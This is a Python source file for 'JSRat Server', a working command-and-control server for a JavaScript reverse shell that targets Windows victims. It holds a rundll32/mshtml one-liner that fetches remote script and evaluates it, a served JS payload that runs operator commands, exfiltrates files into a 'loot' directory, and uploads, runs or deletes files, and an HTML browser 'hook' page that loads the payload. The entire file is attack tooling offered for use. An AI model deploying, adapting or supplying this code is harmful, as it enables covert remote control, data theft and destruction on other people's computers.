#!/usr/bin/env python
#
# JSRat Server - Python Implementation
# By: Hood3dRob1n
#
"""
   Simple JS Reverse Shell over HTTP for Windows
   We run web server and then execute commands against the connecting Client/Victim
  
   Command to Launch JS Reverse Shell from Client||Victim Windows box:
   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://10.10.10.10:31337/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}

   $(JSRat)> cmd /c dir C:\

   References & Original Project:
      http://en.wooyun.io/2016/02/04/42.html
      http://en.wooyun.io/2016/01/18/JavaScript-Backdoor.html
      https://gist.github.com/subTee/f1603fa5c15d5f8825c0

"""

import optparse, os, socket, SocketServer, sys
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from classes.colors import *

try:
  import readline
except:
  error("No Python Readline");
  pad(); bad("No history support as a result, sorry...");


def banner():
  cls();
  print red("\nJSRat Server") + white(" - ") + blue("Python ") + yellow("Implementation");
  print blue("By") + white(": Hood3dRob1n");


def cls():
  if os.name == 'nt' or sys.platform.startswith('win'):
    os.system('cls');
  else:
    os.system('clear');


def internal_ip():
  try:
    iip = [(s.connect(('8.8.8.8', 80)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
  except:
    error("Problem resolving internal IP!")
    return "Problem resolving internal IP!"
  return iip

def jsrat():
  """
      Build & Return the core JS code to operate JSRat on victim
      Essentially serve up additional JS to be evaluated by client based on need
      NOTE: Client must be using IE browser, or all bets are off - but you should know this already...
  """
  jsrat_code = """
			while(true) {
				h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
				h.SetTimeouts(0, 0, 0, 0);
                        	try {
					h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					h.Send();
					c = h.ResponseText;
                            		if(c=="delete") {
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Next Input should be the File to Delete]");
                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
                                		f =fso1.GetFile(d);
                                		f.Delete();
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Delete Success]\\n");
                                		continue;
                            		} else if(c=="download") {
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Next Input should be the File to download]");
                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
                                		f=fso1.OpenTextFile(d,1);
                                		g=f.ReadAll();
                                		f.Close();
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/download",false);
					    	p.Send(g);
                                		continue;
                          		} else if(c=="read") {
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Next Input should be the File to Read]");
                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
                                		f=fso1.OpenTextFile(d,1);
                                		g=f.ReadAll();
                                		f.Close();
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send(g + "\\n");
                                		continue;
                            		} else if(c=="run") {
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Next Input should be the File to Run]");
                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	g.Send();
					    	d = g.ResponseText;
                                		r = new ActiveXObject("WScript.Shell").Run(d,0,true);
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
                                		p.Send("[Run Success]\\n");
                                		continue;      
                            		} else if(c=="upload") {
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                        		 	p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Start to Upload]");
                                		g = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g.SetTimeouts(0, 0, 0, 0);
                                		g.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/uploadpath",false);
					    	g.Send();
					    	dpath = g.ResponseText;
                                		g2 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		g2.SetTimeouts(0, 0, 0, 0);
                                		g2.Open("GET","http://"""+bind_ip+":"+str(listener_port)+"""/uploaddata",false);
					    	g2.Send();
					    	ddata = g2.ResponseText;
                                		fso1=new ActiveXObject("Scripting.FileSystemObject");
                                		f=fso1.CreateTextFile(dpath,true);
                                		f.WriteLine(ddata);
                                		f.Close();
                                		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                                		p.SetTimeouts(0, 0, 0, 0);
					    	p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
					    	p.Send("[Upload Success]\\n");
                                		continue;
                            		} else {
                            			r = new ActiveXObject("WScript.Shell").Exec(c);
				    		var so;
				    		while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
				    		p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
			 	       		p.Send(so + "\\n");
                            		}
                        	} catch(e1) {
                            		p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                            		p.SetTimeouts(0, 0, 0, 0);
					p.Open("POST","http://"""+bind_ip+":"+str(listener_port)+"""/rat",false);
                            		p.Send("[ERROR - No Output]\\n");
				}
			}
		"""
  return jsrat_code;


def print_jsrat_help():
  """
      Displays JSRat options for Server operator to interact w/Client||Victim
  """
  print
  print white(underline("JSRat Usage Options:"));
  print green("      CMD") + white(" => ") + green("Executes Provided Command");
  print green("      run") + white(" => ") + green("Run EXE or Script");
  print green("     read") + white(" => ") + green("Read File");
  print green("   upload") + white(" => ") + green("Upload File");
  print green(" download") + white(" => ") + green("Download File");
  print green("   delete") + white(" => ") + green("Delete File");
  print green("     help") + white(" => ") + green("Help Menu");
  print green("     exit") + white(" => ") + green("Exit Shell");
  print


def get_user_input():
  while True:
    usr_input = raw_input(red("$")+white("(")+blue("JSRat")+white(")")+red(">")+white(" "));
    if usr_input.strip() != "":
      break
    else:
      print
  return usr_input.strip();


class myHandler(BaseHTTPRequestHandler):
  """
      Custom handler so we can control how different web requests are processed
      Crude setup I threw together, but it works so get over it...
  """
  js_load_path = '/connect' # Base URL path to initialize things (value is overridden at server start)
  upload_path = ""; # static so we can set/get as needed, since this isnt powershell...
  time_to_stop = False;

  def log_message(self, format, *args):
    """ Custom Log Handler to Spit out on to stderr """
    return

  def do_GET(self):
    """
        Handle any GET requests coming into our server
    """
    content_type = "text/plain";
    response_message = jsrat();
    if self.js_load_path == self.path:
      good("Incoming JSRat Client: %s" % str(self.client_address[0]));
      if 'user-agent' in self.headers.keys() and self.headers['user-agent'].strip() != "":
        pad(); good("User-Agent: %s" % self.headers['User-Agent'])
      print_jsrat_help();

    elif "/rat" == self.path:
      # Get input from server operator on what to do next...
      response_message = get_user_input();
      if response_message.strip().lower() == "help":
        print_jsrat_help()
        while True:
          response_message = get_user_input();
          if response_message.strip().lower() != "help":
            break
          else:
            print
      elif response_message.strip().lower() == "exit":
        print; caution("OK, sending kill command to Client...")
        response_message = "cmd /c taskkill /f /im rundll32.exe";
        pad(); caution("Hit CTRL+C to kill server....")

    elif "/uploadpath" == self.path:
      lpath = raw_input(red("$")+white("(")+blue("Enter Full Path for Local File to Upload")+white(")")+red(">")+white(" "));
      myHandler.upload_path = lpath;
      caution("Setting local upload path to: %s" % myHandler.upload_path)
      destination_path = raw_input(red("$")+white("(")+blue("Enter Remote Path to Write Uploaded Content")+white(")")+red(">")+white(" "));
      response_message = destination_path.strip();

    elif "/uploaddata" == self.path:
      response_message = open(myHandler.upload_path, 'rb+').read();
      myHandler.upload_path = ""; 

    elif "/hook" == self.path:
      good("Hooking Client: %s" % str(self.client_address[0]));
      content_type = "text/html";
      response_message = jsrat();
      response_message = """<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
  <head>
   <title> new document </title>
   <meta name="generator" content="editplus">
   <meta name="author" content="">
   <meta name="keywords" content="">
   <meta name="description" content="">
  </head>
  <body>
   <script language="javascript" type="text/javascript">
      h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
      h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);
      h.Send();
      B=h.ResponseText;
      eval(B);
    </script>
  </body>
</html>"""

    elif "/wtf" == self.path:
      good("Client Command Query from: %s" % str(self.client_address[0]));
      response_message = """
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://"""+bind_ip+":"+str(listener_port)+srv_url+"""",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}"""
      print cyan(response_message + "\n");

    # Send the built response back to client
    self.send_response(200);
    self.send_header('Content-type',content_type);
    self.end_headers();
    self.wfile.write(response_message);


  def do_POST(self):
    """
        Handle any POST requests coming into our server
    """
    if "/rat" == self.path:
      content_len = int(self.headers.getheader('content-length', 0))
      post_body = self.rfile.read(content_len)
      print cyan(post_body);
      if post_body == "[No Output]":
        print
      self.send_response(200);
      self.send_header('Content-type','text/plain');
      self.end_headers();

    elif "/download" == self.path:
      content_len = int(self.headers.getheader('content-length', 0))
      post_body = self.rfile.read(content_len)
      fname = raw_input(red("$")+white("(")+blue("Enter Filename to Save in ./loot/")+white(")")+red(">")+white(" "));
      try:
        loot_file = outdir.strip()+fname.strip();
        fh = open(loot_file, 'wb+')
        fh.write(post_body)
        fh.close()
        pad(); good("Successfully Saved To: %s\n" % loot_file.replace(home, "./"))
      except Exception, e:
        error("Problem saving content to:")
        pad(); bad("%s" % loot_file.replace(home, "./"))
        pad(); pad(); bad(str(e));
      self.send_response(200);
      self.send_header('Content-type','text/plain');
      self.end_headers();
    else:
      caution("%s - Snooper detected..." % str(self.client_address[0]));
      pad(); caution("=> %s" % self.path);
      self.send_error(404);


def main():
  """ 
      Establish our base web server and initiate the event loop to drive things

      1 - Overrides custom handler path for URL to initiate things
      2 - Binds socket to ip and port, and then maps to our custom handler
      3 - Starts endless event loop & pass off for myHandler to handle requests
  """
  try:
    print
    global httpd;
    myHandler.js_load_path = srv_url;
    httpd = SocketServer.TCPServer((bind_ip, listener_port), myHandler);
    status("Web Server Started on Port: %d" % listener_port);
    status("Awaiting Client Connection to: http://%s:%s%s" % (bind_ip, listener_port, srv_url));
    pad(); status("Client Command at: http://%s:%s/wtf" % (bind_ip, listener_port));
    pad(); status("Browser Hook Set at: http://%s:%s/hook\n" % (bind_ip, listener_port));
    caution("Hit CTRL+C to Stop the Server at any time...\n");
    httpd.serve_forever();
  except socket.error, e:
    error('Try again in 30 seconds or so...')
    pad();  bad('Socket Error:\n\t%s\n' % e)
  except KeyboardInterrupt:
    print ''
    error("CTRL+C Interupt Detected!");
    pad(); bad("Shutting Down Web Server...\n");
    httpd.shutdown;



# Parse Arguments/Options
parser = optparse.OptionParser(banner(), version="%prog v0.01b");
parser.add_option("-i", "--ip", dest="ip", default=None, type="string", help="IP to Bind Server to (default: " + internal_ip() + ")");
parser.add_option("-p", "--port", dest="port", default=None, type="int", help="Port to Run Server on");
parser.add_option("-u", "--url", dest="url", default="/connect", type="string", help="URL to Initiate Client Connection (default: /connect)");
parser.add_option("-v", action="count", default=0, dest="verbose", help="Enable Verbose Output");
(options, args) = parser.parse_args();

# Make sure we got necessary arguments
args = sys.argv[1:];
if not args:
  print "";
  parser.print_help();
  print;
  sys.exit();

if args and options.ip == None:
  bind_ip = internal_ip();
else:
  bind_ip = options.ip

# Establish listner port for our web server (privs needed for low ports < 1024)
if args and options.port == None:
  print ' ';
  error("Missing Argument: --port PORTNUMBER");
  sys.stdout.write('   ');
  error("You need to provide the port to listen on!\n");
  parser.print_help();
  print;
  sys.exit();
else:
  listener_port = options.port;

# Establish system based file seperator
if os.name == 'nt' or sys.platform.startswith('win'):
  delimiter = "\\";
else:
  delimiter = "/";

srv_url    = options.url;     # The URL path to start client initiation on
verbose    = options.verbose; # Enable verbose output for debugging purposes
home       = os.path.dirname(os.path.abspath(__file__)) + delimiter; # Home dir
outdir     = home + "loot" + delimiter;  # Output directory to save content
if not os.path.isfile(outdir) and not os.path.isdir(outdir):
  os.mkdir(outdir);           # Create output directory if it doesn't exist


# Time for the magic show
if __name__ == "__main__":
  try:
    main();

  except KeyboardInterrupt:
    print "\n";
    print red("[") + white("WARNING") + red("]") + white(" CTRL+C, closing session...\n\n");
    sys.exit();

